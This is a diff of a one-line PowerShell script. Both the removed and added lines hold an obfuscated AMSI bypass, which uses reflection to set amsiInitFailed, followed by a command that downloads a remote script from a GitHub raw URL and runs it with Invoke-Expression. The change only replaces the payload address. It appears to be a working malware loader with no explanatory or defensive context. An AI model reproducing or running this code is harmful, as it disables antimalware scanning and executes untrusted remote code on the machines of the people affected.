@@ -1,1 +1,2 @@
-$Value="SetValue";[Ref].Assembly.GetType('System.Management.Automation.'+'Amsi'+'Utils').GetField('amsi'+'Init'+'Failed','NonPublic,Static').$Value($null,$true);Invoke-Expression((Invoke-WebRequest -Uri "https://raw.githubusercontent.com/eforentropy/ps/main/ps.txt").Content)
+$Value="SetValue";[Ref].Assembly.GetType('System.Management.Automation.'+'Amsi'+'Utils').GetField('amsi'+'Init'+'Failed','NonPublic,Static').$Value($null,$true);Invoke-Expression((Invoke-WebRequest -Uri "https://raw.githubusercontent.com/eforentropy/sal/main/2.txt").Content)
+
